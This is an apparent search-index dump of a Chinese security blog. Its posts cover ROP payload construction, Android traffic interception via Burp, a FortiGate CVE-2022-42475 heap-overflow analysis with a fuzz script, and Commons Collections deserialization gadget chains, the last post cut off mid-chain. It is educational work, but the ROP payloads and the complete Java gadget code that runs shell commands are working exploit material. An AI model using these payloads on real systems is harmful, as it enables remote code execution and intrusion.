[{"title":"32位与64位ROP构造差异","url":"/2019/05/16/32%E4%BD%8D%E4%B8%8E64%E4%BD%8DROP%E6%9E%84%E9%80%A0%E5%B7%AE%E5%BC%82/","content":"ROP什么是ROPROP的全称为Return-oriented programming（返回导向编程），也可以理解为面向返回地址的编程，这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。\n为什么要ROP探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，ROP就是一种。\n32位32位程序的栈溢出，只有输入的字节填满栈空间，和返回地址，即可劫持栈帧，达到控制执行流的效果,\n假设栈开辟了20字节的空间，rbp为8字节，由此可得payload如下\npythonpayload = b&#x27;A&#x27;*(0x20+0x8) + p32(system_addr) + p32(bin_addr)\n\n64位寄存器传参64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。\n分别是rdi，rsi，rdx，rcx，r8，r9作为第1-6个参数。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，所以rbp作为通用寄存器使用。\n\n堆栈平衡还有一点要考虑的就是堆栈平衡，那么问题来了，什么是堆栈平衡。\n\n如何要返回父程序，则当我们在堆栈中进行堆栈的操作时候，一定要保证在RET这条指令之前，ESP指向的是我们压入栈中的地址\n如果通过堆栈传递了参数了，那么在函数执行完毕后，要平衡参数导致的堆栈变化\n\n人话就是，当函数在一步步执行的时候 一直到ret执行之前，堆栈栈顶的地址 一定要是call指令的下一个地址。\n也就是说函数执行前一直到函数执行结束，函数里面的堆栈是要保持不变的。\n如果堆栈变化了，那么，要在ret执行前将堆栈恢复成原来的样子。\n构造payload64位还要考虑堆栈平衡，由此可以有3种payload写法。\n清空rdi寄存器，ret维持堆栈平衡，将GOT表地址和PLT表地址弹到rdi寄存器，在通过libc搜索得到libc版本\npython# 泄露libc地址payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)\n\n塞满栈空间和返回地址，维持堆栈平衡，清空rdi寄存器获取偏移地址，塞入&#x2F;bin&#x2F;sh字符和system函数\npython# 命令执行payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\npython# 寄存器调用顺序：rdi、rsi、rdx、rcx、r8、r9# 先利用pop+ret将bin_sh_addr地址弹到rdi寄存器中去，再调用system函数来执行payload = &#x27;a&#x27; * (0x0f+0x08) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\n前两个payload利用64位程序函数调用参数规则构造\npython// ret堆栈平衡，直接返回bin_sh_addr处也可以获得系统权限。payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(bin_sh_addr)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["二进制安全"],"tags":["ROP","Payload构造"]},{"title":"APK流量转发","url":"/2019/04/13/APK%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/","content":"APK流量转发实现安卓APP全局&#x2F;单个APP的代理\n需要的工具有：\n\nproxifier\nclash\n夜神模拟器\n\n安装BurpSuite证书先在Tools→Proxy页面新建局域网代理端口：\n\n点击Import &#x2F; expoet CA certificate 选择Certificate in DER format导出CA证书并保存到某一个文件夹：\n\n点击文件助手打开电脑文件夹，将证书移动至Download文件夹下（默认就是Download目录）：\n\n\n\n回到本机中，打开CMD窗口，cd命令进入下载的夜神模拟器的bin目录下：\n\nnox_adb.exe即为夜神模拟器adb模式端口，使用nox_adb.exe执行以下命令（分步执行）：\nshellnox_adb.exe rootnox_adb.exe remountnox_adb.exe shell\n\n\n此时在此处输入：cd sdcard&#x2F;Download\n执行以下命令：\nshellmv CA.der /system/etc/security/cacerts/chmod 644 /system/etc/security/cacerts/CA.der\n\nPS：此时后缀名一定要是xxx.der不是的话要重新#生成证书并保存到htdocs文件夹！\n上诉方法如果未成功，可以用这个。\n把CA.der改为CA.cer\n点系统，搜索从SD卡安装证书，找到CA.cer安装即可。\n安装+配置Clash下载clash，原作者已删库，自行找。\n下载好之后在夜神模拟器中导入apk文件：\n直接拖入即可\n\n在本机中新建一个yaml文件\nyamlmixed-port: 7890allow-lan: falsemode: globallog-level: infoexternal-controller: 127.0.0.1:9090proxies:  # http  - name: &quot;http&quot;    type: http    server: 192.168.0.106    port: 8081    # username: username    # password: password    # tls: true # https    # skip-cert-verify: true    # sni: custom.comproxy-groups:  - name: Proxy    type: select    # disable-udp: true    proxies:      - http\n\n192.168.0.106和后面的端口改为自己的IP和burp监听的端口\n再把此文件拖入夜神模拟器中\n\n打开clash，点击配置\n\n点+号\n\n将刚刚写的yaml文件导入\n\n\n\n之后在启动代理\n\n点击代理\n\n选择http，按下闪电按钮\n\n此时就可以抓取APP全部流量包了\n\n抓取单个APP流量包选关闭代理，再点设备\n\n选择网络\n\n单击访问控制模式\n\n选择仅运行已选择的应用\n\n访问控制应用包列表\n\n即可抓取单个APP的流量包\n同理，要渗透小程序时，就仅通过微信即可\n","categories":["安卓"],"tags":["APP","APK","APP渗透","小程序渗透"]},{"title":"CVE-2022-42475 分析","url":"/2023/03/15/CVE-2022-42475%20%E5%88%86%E6%9E%90/","content":"环境准备Fortinet 官方对 Fortigate 等设备的虚拟机版本开放下载，下载链接\n下载到虚拟机镜像后导入 vmware 安装，第一次启动先配置网络\n使用默认用户 admin:空密码 登录到 CLI\nshellconfig system interfaceedit port1set mode staticset ip 192.168.x.x/255.255.255.0end\n\n配置好网络后通过浏览器访问到设备 web 界面，首次登录系统会要求导入 license。这里有两种选择，一是完整 license，二是试用版。我们选择试用版 license，先去官方网站注册一个 FortiCloud 账号，然后在系统上登录，等待重启即可。(也可以参考文章尝试破解 License 授权)\n漏洞位于设备的 SSLVPN 功能中，分析前需要配置 VPN 功能。配置过程可参考官方文档，简单来说，首先在 User &amp; Authentication -&gt; User Definition 功能中创建一些 VPN 账户，添加到同一个 group 中。然后在 VPN -&gt; SSL-VPN Settings 中填写监听网卡和端口等信息。最后按照提示创建一条防火墙规则允许外部请求进入。\n\n这样访问对应接口即可看到 SSLVPN 界面。\n代码和权限获取我们采用挂载磁盘的方法，关闭虚拟机，将较小的磁盘卸载并挂载到另一台 Linux 系统上，开机之后看到系统识别到一些硬盘分区：\n\n在 FORTIOS 分区中的 rootfs.gz 是主要文件系统，将其解压得到一些系统文件，但 bin 等目录下没有任何内容。我们参考网络上的文章发现关键文件在 bin.tar.xz、migadmin.tar.xz 等压缩包内，这些压缩档案使用 Fortinet 自己修改过的工具打包。具体解包方法，在解压目录下执行命令\nshellsudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xzsudo chroot . /sbin/ftar -xf /bin.tarsudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xzsudo chroot . /sbin/ftar -xf /migadmin.tar\n\n解包之后找到 &#x2F;bin&#x2F;init，系统中的大部分业务程序都软链接到该二进制文件，是我们主要的分析目标。\n按照相同的方法提取出 7.2.2 和 7.2.3 中的 init 文件，准备进行补丁分析。\n权限获取可参考网络文章。\n漏洞分析首先进行补丁对比，将不同版本的 init 程序导入 IDA 分析，保存 idb 之后用 bindiff 比较，需要注意一点，直接使用 bindiff GUI 可能会卡在解包 idb 阶段，建议使用 IDA 中的 bindiff 插件比对，程序较大需要分析较长时间。\n\n比较完成后按照相似度和置信度逐个分析代码差异，新版本对 wad 部分进行了很多修改，除此之外比较明显的修改位于内存分配函数中。\n举例来说，7.2.2 版本中某内存分配函数\n伪代码__int64 __fastcall sub_1776C70(__int64 a1, __int64 a2, unsigned int a3)&#123;  __int64 v4; // rax  __int64 v5; // r12  v4 = je_malloc();  v5 = v4;  if ( !v4 )  &#123;    sub_16CFB00(0, 8, &quot;malloc(%ld) calling from %s:%d failed.\\n&quot;, a1, a2, a3);    return v5;  &#125;  ++qword_A8AC610;  if ( !byte_A8AC620 )    return v5;  sub_1777590(v4, a1, a2, a3);  return v5;\n\n在 7.2.3 中对应函数\n伪代码__int64 __fastcall sub_1776E60(unsigned __int64 a1, __int64 a2, unsigned int a3)&#123;  __int64 v3; // r12  __int64 v5; // rax  v3 = 0LL;  if ( a1 &gt; 0x40000000 )    return v3;  v5 = je_malloc();  v3 = v5;  if ( !v5 )  &#123;    sub_16CFB30(0, 8, &quot;malloc(%ld) calling from %s:%d failed.\\n&quot;, a1, a2, a3);    return v3;  &#125;  ++qword_A8AD770;  if ( !byte_A8AD780 )    return v3;  sub_17777D0(v5, a1, a2, a3);  return v3;&#125;\n\n我们发现新版本的内存分配相关函数中都添加了对 size 的判断，要求其不能大于 0x40000000\n考虑到该漏洞是一个堆内存溢出，根据修复方式推测漏洞的根本原因可能是某处发生整数溢出，导致内存分配函数返回了一块较小的内存，而后续拷贝数据时又使用了较大的 size。\n而在 HTTP 请求中可能有两种情况会导致以上结果，一是某些功能 handler 函数中对用户提交的参数验证不严格，或者代码在解析请求时对 Content-Length 的解析出现异常。\nsslvpn 中在未授权情况下能够访问的功能点不多，漏洞出现在请求解析阶段可能性比较大。sslvpnd 是基于 Apache httpd 修改而来，开发者在其中添加了很多自定义代码，导致复杂度较高，而且程序不包含符号信息，分析起来会消耗很多时间。\n我们可以采取更简单的方法，基于补丁分析和推测，漏洞可能发生在解析请求，特别是处理 Content-Length 阶段。那么只需要按照 fuzz HTTP 协议的思路，构造一些带有畸形 Content-Length 的请求，例如 CL 过大、或者等于负数的情况，将这些请求发送到能够未授权访问的接口中，同时检测 web 服务状态，发生崩溃或无法收到响应时记录下对应的请求报文。\n编写出测试脚本：\npythonimport socketimport sslpath = &quot;/remote/login&quot;.encode()content_length = [&quot;0&quot;, &quot;-1&quot;, &quot;2147483647&quot;, &quot;2147483648&quot;, &quot;-0&quot;, &quot;4294967295&quot;, &quot;4294967296&quot;, &quot;1111111111111&quot;, &quot;22222222222&quot;]for CL in content_length:    try:        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\\r\\nHost: 192.168.232.129\\r\\nContent-Length: &quot; + CL.encode() + b&quot;\\r\\nUser-Agent: Mozilla/5.0\\r\\nContent-Type: text/plain;charset=UTF-8\\r\\nAccept: */*\\r\\n\\r\\na=1&quot;        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.232.129&quot;, 4443))        _default_context = ssl._create_unverified_context()        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)        res = _socket.recv(1024)        if b&quot;HTTP/1.1&quot; not in res:            print(&quot;Error detected&quot;)            print(CL)            break    except Exception as e:        print(e)        print(&quot;Error detected&quot;)        print(CL)        break\n\n运行后当发送 CL 等于 2147483647 时服务器没有响应，手动测试结果也一致。\n\n挂载调试器尝试捕获异常信息\n\n发包之后产生段错误，访问 rdi 时遇到非法地址。通过栈回溯分析其调用信息，最终找到了关键函数 read_post_data\nc__int64 __fastcall read_post_data(__int64 a1)&#123;  __int64 *v1; // r12  __int64 v2; // rax  __int64 v3; // rbx  int v4; // eax  int v5; // er12  __int64 v6; // rdi  __int64 content_length; // rdx  int v8; // er12  __int64 v10; // rdx  int v11; // er12  v1 = *(a1 + 736);  v2 = get_req(*(a1 + 664));  v3 = v2;  if ( !*(v2 + 8) )    *(v2 + 8) = pool_alloc(*v1, *(v2 + 24) + 1);    // Content-Length  v4 = unknow_0(v1, v3 + 32, 8190LL);  v5 = v4;  if ( v4 )  &#123;    if ( v4 &lt; 0 )    &#123;      if ( unknow_1(*(a1 + 616)) - 1 &lt;= 4 )        return 0LL;    &#125;    else    &#123;      v6 = *(v3 + 16);      content_length = *(v3 + 24);      if ( v6 + v4 &gt; content_length )        v5 = *(v3 + 24) - v6;      if ( content_length &gt; v6 )      &#123;        memcpy((*(v3 + 8) + v6), (v3 + 32), v5);        v10 = *(v3 + 24);        v11 = *(v3 + 16) + v5;        *(v3 + 16) = v11;        if ( v11 &lt; v10 )          return 0LL;      &#125;      else      &#123;        v8 = *(v3 + 16) + v5;        *(v3 + 16) = v8;        if ( v8 &lt; content_length )          return 0LL;      &#125;    &#125;  &#125;  return 2LL;&#125;\n\n这个函数负责从 POST 请求体中读取输入，其基本逻辑：首先获取到用户提交的 Content-Length 值，传入 pool_alloc 函数中分配内存空间，之后使用 memcpy 将用户数据拷贝到刚刚分配的内存中。\n问题就出在 pool_alloc 参数上面，查看汇编指令\nasmmov     eax, [rax+18h]mov     rdi, [r12]lea     esi, [rax+1]movsxd  rsi, esicall    pool_alloc\n\nrax 为用户请求结构体指针，偏移位置 0x18 存放了 CL 值。先将 CL 放在 eax 寄存器中，使用 lea 指令将其加一后放在 esi 寄存器，再用 movsxd 扩展为 64 bit 值。结合调试信息就可以看到程序为何崩溃。\n在 fuzz 脚本中传入 CL &#x3D; 2147483647，换成 hex 为 0x7fffffff，经过上面的运算当传入 pool_alloc 时寄存器情况：\n\npool_alloc 函数的伪代码:\n伪代码void *__fastcall sub_164E590(__int64 a1, size_t a2)&#123;  _QWORD *v2; // rax  char *v3; // r8  unsigned __int64 v4; // rbx  unsigned __int64 v7; // rdi  __int64 v8; // rax  v2 = *(a1 + 8);  v3 = v2[2];  if ( a2 )  &#123;    v4 = 8LL * (((a2 - 1) &gt;&gt; 3) + 1);    if ( &amp;v3[v4] &gt; *v2 )    &#123;      v7 = dword_A8AC5A4 - 25;      if ( v7 &lt; v4 )        v7 = 8LL * (((a2 - 1) &gt;&gt; 3) + 1);      v8 = malloc_block(v7);      *(*(a1 + 8) + 8LL) = v8;      *(a1 + 8) = v8;      v3 = *(v8 + 16);      *(v8 + 16) = &amp;v3[v4];    &#125;    else    &#123;      v2[2] = &amp;v3[v4];    &#125;  &#125;  else  &#123;    v3 = 0LL;  &#125;  return memset(v3, 0, a2);&#125;\n\n传入数据参与补齐运算，然后判断在 v3 数组中对应位置是否存在内容，不存在则直接调用 memset 返回，而当调用 memset 时参数情况：\n\nlength 部分变成一个非常大的数值，这样会导致 memset 访问到非法内存使程序崩溃。\n考察漏洞根本原因，在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法，这里存在整数溢出。那么我们可以构造特殊的 CL 值，比如 0x1b00000000，经过运算拓展之后会变成 0x1，在 pool_alloc 内部调用 memset 时情况：\n\n缓冲区是位于 heap 的一块较小内存，而 size 已经变成 0x1。\n这样 pool_alloc 返回了一块较小的堆内存，假设此时我们在 POST 请求体中构造了超长的数据，那么在后续的 memcpy 阶段就会导致堆内存溢出。\n\n某些情况下能够得到如下 crash\n\n利用分析对于 FortiGate 堆溢出的利用，DEVCORE 曾介绍过思路\n传统堆溢出利用需要结合堆相关的管理逻辑，通过精心控制堆块排布来控制程序执行流。但正如 DEVCORE 文章和我们 fuzz 结果显示，在 FortiGate 上堆溢出会覆盖堆中某些关键结构体中的数据，具体来说是 HTTP 请求的 SSL 结构体指针。在触发漏洞之前先发送很多正常的 HTTP 请求，这样在堆中就会留下很多 SSL 结构，再触发堆溢出去覆盖这些结构体，当程序调用被覆盖的结构体中 handshake_func 指针时，我们就能直接劫持程序控制流。\n观察崩溃现场，rdx 寄存器指向可控内存，我们可以在程序中找到 push rdx ; pop rsp 的 gadget，将 stack 迁移到可控内存中，将堆溢出转换成 ROP，直接执行 system(‘cmd’) 即可。\n补丁新版的 read_post_data 调用 pool_alloc 时代码\nasmmov     rax, [rax+18h]mov     rdi, [r12]lea     rsi, [rax+1]call    pool_alloc\n\n不再使用 32 位寄存器拓展，并且分配内存时会检查 size 大小。\n参考FortiOS 5.4 后门植入;\nDEVCORE 关于 FortiGate 堆溢出漏洞利用的文章;\n2023 年 1 月 11 日，Fortinet 官方发布了关于积极利用该漏洞的组织，以及他们所使用工具的分析文章。\n2023 年 5 月 17 日，BishopFox 发布了一种更完整的利用此漏洞的文章。\n","categories":["二进制安全"],"tags":["ROP","堆溢出","Fortinet"]},{"title":"CommonsCollections 系列反序列化","url":"/2022/07/10/CommonsCollections%20%E7%B3%BB%E5%88%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"\nTips：主要是只写了个人的理解，并没有多详细\n\nimport { GithubCard } from ‘astro-pure&#x2F;advanced’;\nCommonsCollections1依赖\nCommonsCollections &lt;= 3.2.1\nJava &lt; 8u71\n\n利用链textObjectInputStream.readObject()  AnnotationInvocationHandler.readObject()    Map(Proxy).entrySet()      AnnotationInvocationHandler.invoke()        LazyMap.get()          ChainedTransformer.transform()            ConstantTransformer.transform()            InvokerTransformer.transform()              Method.invoke()                Class.getMethod()            InvokerTransformer.transform()              Method.invoke()                Runtime.getRuntime()            InvokerTransformer.transform()              Method.invoke()                Runtime.exec()            ConstantTransformer.transform()\n\n分析大致可以分为两部分，一部分是构造 ChainedTransformer ，另一部分是设法调用这个 chain 的 transform方法。其中前者可以直接表示为:\njavafinal Transformer[]transformers=new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;        String.class,Class[].class&#125;,new Object[]&#123;        &quot;getRuntime&quot;,new Class[0]&#125;),        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;        Object.class,Object[].class&#125;,new Object[]&#123;        null,new Object[0]&#125;),        new InvokerTransformer(&quot;exec&quot;,        new Class[]&#123;String.class&#125;,new String[]&#123;&quot;say yes&quot;&#125;),        &#125;;        ChainedTransformer chain=new ChainedTransformer(transformers);\n\n当这里的 chain.transform 被调用时，执行的命令类似:\njavaRuntime.getRuntime().exec(&quot;say yes&quot;);\n\n更深入的，调用过程类似下面的反射调用:\njavaClass cls=Object.class.getClass();        Method m=cls.getMethod(&quot;getMethod&quot;,String.class,Class[].class);        Object getRuntime=m.invoke(Runtime.class,&quot;getRuntime&quot;,new Class[0]);        cls=getRuntime.getClass();        m=cls.getMethod(&quot;invoke&quot;,Object.class,Object[].class);        Object runtime=m.invoke(getRuntime,null,new Object[0]);        m=runtime.getClass().getMethod(&quot;exec&quot;,String.class);        m.invoke(runtime,&quot;say yes&quot;);\n\n关键在于如何去调用这个 chain 的 transform 方法，ysoserial 的 CommonsCollections1用的调用链依赖于两次 AnnotationInvocationHandler 的代理和一个 LazyMap 的最终触发，这个过程完整手写的话如下:\njavafinal String[]execArgs=new String[]&#123;&quot;touch /tmp/aaaa&quot;&#125;;final Transformer[]transformers=new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;        String.class,Class[].class&#125;,new Object[]&#123;        &quot;getRuntime&quot;,new Class[0]&#125;),        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;        Object.class,Object[].class&#125;,new Object[]&#123;        null,new Object[0]&#125;),        new InvokerTransformer(&quot;exec&quot;,        new Class[]&#123;String.class&#125;,execArgs),        // 注意这里多了一个 HashSet，这样可以避免原版的一个 Cast Error        new ConstantTransformer(new HashSet&lt;String&gt;())&#125;;        ChainedTransformer chain=new ChainedTransformer(transformers);        Map hashMap=new HashMap();// 当 LazyMap.get 被调用时，会触发 chain.transform        Map m=LazyMap.decorate(hashMap,chain);// sun.reflect.annotation.AnnotationInvocationHandler 不是 public 的，不能直接构造出来        Constructor constructor=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);        constructor.setAccessible(true);// 这里的 Deprecated.class 可以换成任意一个 AnnotationType        InvocationHandler handler=(InvocationHandler)constructor.newInstance(Deprecated.class,m);// 这里套一层 proxy 为了在 readObject 是调用 entrySet 时调用 AnnotationInvocation 的 invoke 方法, 其中会调用 lazyMap 的 get 从而触发        Object proxy=Proxy.newProxyInstance(handler.getClass().getClassLoader(),new Class[]&#123;Map.class&#125;,handler);// 最外层是 AnnotationInvocationHandler，触发 readObject 操作        Object obj=constructor.newInstance(Deprecated.class,proxy);        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));        out.writeObject(obj);        out.close();\n\nCommonsCollections2依赖\nCommonsCollections4.0\n\n利用链textObjectInputStream.readObject()      PriorityQueue.readObject()      ...      TransformingComparator.compare()      InvokerTransformer.transform()      TemplatesImpl.newTransformer()      TemplatesTmpl.getTransletInstance()      TemplatesTmpl.defineTransletClasses()      TemplatesTmpl.newInstance()      ClassInitializer()      Runtime.exec()\n\n分析javapublic static void main(String[]args)throws Exception&#123;        String code=&quot;&#123;System.out.println(&#x27;1&#x27;);&#125;&quot;;        ClassPool pool=ClassPool.getDefault();        CtClass clazz=pool.get(Exception.class.getName());        clazz.makeClassInitializer().insertBefore(code);        clazz.setName(&quot;demo&quot;);        byte[]byteCode=clazz.toBytecode();        // load bytecode        Class cls=new DefiningClassLoader().defineClass(&quot;demo&quot;,byteCode);        cls.newInstance();        &#125;// 效果类似public class Exception extends Throwable &#123;    &#123;        System.out.println(&#x27;1&#x27;);    &#125;    ...&#125;\n\n这段代码展示了两个小知识，一是可以利用 ClassLoader 去加载字节码然后执行，而是借助 javassist的强大魅力，可以轻松的给已有的类做编排（Instrumenting）内置类型 Exception 增加一段 static代码块，加载字节码市，静态代码块就会被执行，借助这个特性，可以做一些非常 Magic 和 Amazing 的事情。\nCommonCollections2 和下面的几个利用链都用到了 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类，这个类有个特性当调用 newTransform 时，会加载内部的 &#96;_bytecode 中的字节码并实例化，这个利用链手写大致如下:\njavapublic static class FooBar implements Serializable &#123;&#125;    public static void main(String[] args) throws Exception &#123;        ClassPool pool             = ClassPool.getDefault();        String    AbstractTranslet = &quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;;        pool.insertClassPath(new ClassClassPath(FooBar.class));        pool.insertClassPath(new ClassClassPath(Class.forName(AbstractTranslet)));        CtClass bar      = pool.get(FooBar.class.getName());        CtClass translet = pool.get(Class.forName(AbstractTranslet).getName());        // 给 bar 动态设置父类，同时设置 static 的初始化恶意代码        bar.setSuperclass(translet);        bar.makeClassInitializer().insertBefore(&quot;&#123;Runtime.getRuntime().exec(\\&quot;touch /tmp/abc\\&quot;);&#125;&quot;);        // hack it. 为了避免 postInitialization 的调用，防止反序列化报错        bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;&#123;$0.transletVersion=101;&#125;&quot;);        byte[] b = bar.toBytecode();        // 这个是为了避免 _auxClasses 为空导致的 Exception        byte[] foo = pool.get(Gadgets.Foo.class.getName()).toBytecode();        // 实例化方法没用开，用反射做        Constructor con = TemplatesImpl.class.getDeclaredConstructor(byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class);        con.setAccessible(true);        Templates tpl = (Templates) con.newInstance(new byte[][]&#123;b, foo&#125;, &quot;abc&quot;, new Properties(), 1, new TransformerFactoryImpl());    ...        // 后续调用链只需触发 tpl.newTransformer() 即可触发    &#125;&#125;\n\n这里相比原版加了一行 bar.getDeclaredConstructor(new CtClass[0]).insertAfter(&quot;&#123;$0.transletVersion=101;&#125;&quot;);这个可以有效防止序列化之后的报错，整个序列化流程跑完没有任何异常，非常舒服。我们将这个函数保存为 createTemplate()，后面就不用再写相同代码了。至于触发方法，在 CommonsCollections2 中用的是这样的利用链:\njavafinal Object templates=Gadgets.createTemplatesImpl(command);// mock method name until armedfinal InvokerTransformer transformer=new InvokerTransformer(&quot;toString&quot;,new Class[0],new Object[0]);// create queue with numbers and basic comparatorfinal PriorityQueue&lt;Object&gt; queue=new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));// stub data for replacement later        queue.add(1);        queue.add(1);// switch method called by comparator        Reflections.setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);// switch contents of queuefinal Object[]queueArray=(Object[])Reflections.getFieldValue(queue,&quot;queue&quot;);        queueArray[0]=tpl;        queueArray[1]=1;// then write queue\n\n这里用了一个小技巧是利用反射延迟设置 queue 内部的值，防止 queue.add 时利用链就被触发了。但这个成功反序列化后也会有个错误，原因是Templeates 被实例化后是不可被比较的，我把利用链稍微调整了一下就可以规避这个问题，这个利用链支调整了最终 transform的逻辑，核心触发逻辑没变，就不作为 2_1 来写了:\njavaTemplates tpl=MyGadget.createTemplate();        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;toString&quot;,new Class[0],new Object[0]);        ChainedTransformer transformer=new ChainedTransformer(new Transformer[]&#123;        new ConstantTransformer(tpl),        invokerTransformer,        // 返回一个 constant 值，防止报错        new ConstantTransformer(1),        &#125;);        PriorityQueue&lt;Object&gt; queue=new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));        queue.add(1);        queue.add(2);        Field i=invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);        i.setAccessible(true);        i.set(invokerTransformer,&quot;newTransformer&quot;);// then write queue\n\nCommonsCollections3依赖\nCommonsCollections &lt;= 3.2.1\nJava &lt; 8u71\n\n利用链textObjectInputStream.readObject()        AnnotationInvocationHandler.readObject()        Map(Proxy).entrySet()        AnnotationInvocationHandler.invoke()        LazyMap.get()        ChainedTransformer.transform()        // 变的是下面这部分        ConstantTransformer.transform()        InstantiateTransformer.transform()        TrAXFilter()        TemplatesImpl.newTransformer()        TemplatesTmpl.getTransletInstance()        TemplatesTmpl.defineTransletClasses()        TemplatesTmpl.newInstance()        ClassInitializer()        Runtime.exec()\n\n分析和 CommonCollectins1 的前半部分是一致的，所以依赖都是一致的。不同的是借助 InstantiateTransformer 和 TrAXFilter 这个链完成TemplateImpl 的实例化，能利用的原因在于 TrAXFilter 这个类的实例化函数是这样的:\njavapublic TrAXFilter(Templates templates)throws TransformerConfigurationException       &#123;       _templates=templates;       _transformer=(TransformerImpl)templates.newTransformer();       _transformerHandler=new TransformerHandlerImpl(_transformer);       &#125;\n\n顺手可以手写一份利用代码:\njavaTemplates tpl=MyGadget.createTemplate();        Transformer chain=new ChainedTransformer(new Transformer[]&#123;        new ConstantTransformer(TrAXFilter.class),        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;tpl&#125;),        &#125;);// chain 的触发和 1 一样，不再赘述\n\nCommonsCollections4依赖\nCommonsCollections4.0\n\n利用链textObjectInputStream.readObject()      PriorityQueue.readObject()      ...      TransformingComparator.compare()      ChainedTransformer.transform()      // 变的是下面这部分      ConstantTransformer.transform()      InstantiateTransformer.transform()      TrAXFilter()      TemplatesImpl.newTransformer()      TemplatesTmpl.getTransletInstance()      TemplatesTmpl.defineTransletClasses()      TemplatesTmpl.newInstance()      ClassInitializer()      Runtime.exec()\n\n分析这个就是 2 的后半部分用了 InstantiateTransformer ，和我自己写的那个只有一点点的不一样，不再赘述\njavaTemplates tpl=MyGadget.createTemplate();        ConstantTransformer constantTransformer=new ConstantTransformer(String.class);        InstantiateTransformer initTransformer=new InstantiateTransformer(new Class[]&#123;&#125;,new Object[]&#123;&#125;);        Transformer transformer=new ChainedTransformer(new Transformer[]&#123;        constantTransformer,        initTransformer,        new ConstantTransformer(1),        &#125;);        PriorityQueue&lt;Object&gt; queue=new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));        queue.add(1);        queue.add(2);        Field i=constantTransformer.getClass().getDeclaredField(&quot;iConstant&quot;);        i.setAccessible(true);        i.set(constantTransformer,TrAXFilter.class);        i=initTransformer.getClass().getDeclaredField(&quot;iParamTypes&quot;);        i.setAccessible(true);        i.set(initTransformer,new Class[]&#123;Templates.class&#125;);        i=initTransformer.getClass().getDeclaredField(&quot;iArgs&quot;);        i.setAccessible(true);        i.set(initTransformer,new Object[]&#123;tpl&#125;);// then write queue\n\nCommonsCollections5依赖\nCommonsCollections &lt;= 3.2.1\nJava &gt;= 8u76\nSecurityManager 未开启\n\n利用链textBadAttributeValueExpException.readObject()        TiedMapEntry.toString()        LazyMap.get()        ChainedTransformer.transform()        ConstantTransformer.transform()        InvokerTransformer.transform()        Method.invoke()        Class.getMethod()        InvokerTransformer.transform()        Method.invoke()        Runtime.getRuntime()        InvokerTransformer.transform()        Method.invoke()        Runtime.exec()\n\n分析这个 gadget 只能在 8u76 之后用，原因在于 8u76 为 BadAttributeValueExpException 添加了 readObject\njavaprivate void readObject(ObjectInputStream ois)throws IOException,ClassNotFoundException&#123;        ObjectInputStream.GetField gf=ois.readFields();        Object valObj=gf.get(&quot;val&quot;,null);        if(valObj==null)&#123;        val=null;        &#125;else if(valObj instanceof String)&#123;        val=valObj;        &#125;else if(System.getSecurityManager()==null        ||valObj instanceof Long        ||valObj instanceof Integer        ||valObj instanceof Float        ||valObj instanceof Double        ||valObj instanceof Byte        ||valObj instanceof Short        ||valObj instanceof Boolean)&#123;        val=valObj.toString();        &#125;else&#123; // the serialized object is from a version without JDK-8019292 fix        val=System.identityHashCode(valObj)+&quot;@&quot;+valObj.getClass().getName();        &#125;        &#125;\n\n同时 TiedMap 的 toString 方法为，可以说是非常人性化了:\njava// LazyMap 和 1 的是一样的Map m=LazyMap.decorate(hashMap,chain);        Object obj=new BadAttributeValueExpException(&quot;&quot;);        Field i=obj.getClass().getDeclaredField(&quot;val&quot;);        i.setAccessible(true);        i.set(obj,new TiedMapEntry(m,&quot;value&quot;));// then write obj\n\nCommonsCollections6依赖\nCommonsCollections &lt;= 3.2.1\n\n利用链textjava.util.HashMap.readObject()        